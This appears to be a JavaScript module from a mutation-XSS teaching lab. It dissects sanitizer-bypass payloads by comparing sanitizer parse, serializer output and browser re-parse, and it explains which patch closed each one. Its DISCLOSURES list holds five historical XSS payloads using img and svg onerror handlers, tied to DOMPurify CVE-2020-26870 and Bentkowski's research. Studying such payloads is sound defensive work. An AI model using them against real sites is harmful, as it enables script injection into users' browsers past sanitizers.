// Module 10 — Reading Disclosures Like a Researcher
//
// A repeatable dissection: for any mutation-XSS payload, answer four questions.
//   Q1  What does the SANITIZER's parse produce?     (parseFragment, scripting off)
//   Q2  What does the SERIALIZER emit?               (serialize)
//   Q3  What does the BROWSER's re-parse produce?       (parseFragment, scripting on)
//   Q4  Which single step is the hinge — the one that, if changed, closes it?
//
// Then: which historical patch changed that step.

import { parseFragment, serialize, treeString, elementNames, hasLiveHandler }
  from '../../../engine/mxss-lab/lab.mjs';

export { parseFragment, serialize, treeString, elementNames, hasLiveHandler };

export function dissect(payload, { sanitizerContext = 'template', sinkContext = 'div' } = {}) {
  const q1 = parseFragment(payload, sanitizerContext, { scripting: false });
  const serialized = serialize(q1);
  const q3 = parseFragment(serialized, sinkContext, { scripting: true });

  const sanitizerSawSafe = !hasLiveHandler(q1);
  const browserBuiltDanger = hasLiveHandler(q3);

  let hinge = 'none — this payload does not mutate (safe both sides, or dangerous both sides)';
  if (sanitizerSawSafe && browserBuiltDanger) {
    if (elementNames(q1).join() !== elementNames(q3).join()) {
      hinge = classifyHinge(payload, serialized);
    }
  }

  return {
    payload,
    q1_sanitizer_tree: treeString(q1),
    q1_elements: elementNames(q1),
    q1_safe: sanitizerSawSafe,
    q2_serialized: serialized,
    q3_browser_tree: treeString(q3),
    q3_elements: elementNames(q3),
    q3_dangerous: browserBuiltDanger,
    q4_hinge: hinge,
    mutates: sanitizerSawSafe && browserBuiltDanger,
  };
}

function classifyHinge(payload, serialized) {
  if (/<(style|script|xmp|noembed|noframes)[^>]*>/i.test(serialized) && /<\/(style|script|xmp)/i.test(serialized))
    return 'raw-text emission: the serializer wrote <style>/<xmp> content verbatim, and a </...> in it breaks out on reparse. Patch: forbid the element, or scan its content.';
  if (/xmlns|svg|math|mglyph|mtext/i.test(payload))
    return 'namespace boundary: the sanitizer judged an element by name while it was in a foreign namespace. Patch: DOMPurify _checkValidNamespace (post-2.0.x).';
  if (/<noscript/i.test(payload))
    return 'scripting flag: the sanitizer parsed <noscript> content as markup (flag off), the browser as text (flag on). Patch: attribute < > escaping in the serializer (~2020) + a dedicated <noscript> check.';
  if (/&lt;|&gt;|&#/i.test(payload) && /title=|alt=|id=/i.test(payload))
    return 'attribute serialization: an entity in an attribute became a raw < on serialize. Patch: escape < > in attribute values (~2020).';
  if (/<template/i.test(payload))
    return 'template fragment: the sanitizer walked .children (empty) not .content. Patch: NodeIterator that enters template content; unwrap <template>.';
  return 'context mismatch: the sanitizer and the sink parsed in different contexts (Module 9).';
}

// A small set of historically-real payloads (shapes from public write-ups),
// each dissected to show the method. NOT all still fire in current browsers —
// the dissection reports that honestly.
export const DISCLOSURES = [
  { id: 'CVE-2020-26870 (DOMPurify < 2.0.17)', ref: '[R10]',
    payload: '<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></a></style></svg>' },
  { id: 'Bentkowski 2019 — <form>/<math> nesting', ref: '[R10]',
    payload: '<form><math><mtext></form><form><img src=x onerror=alert(1)></form>' },
  { id: 'Bentkowski 2019 — <mglyph>/<style>', ref: '[R9]',
    payload: '<math><mtext><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>' },
  { id: 'Google Search 2019 — <noscript>', ref: '[R9]',
    payload: '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>' },
  { id: '<image> alias (recurring)', ref: '[R11]',
    payload: '<svg><image href=x onerror=alert(1)></svg>' },
];
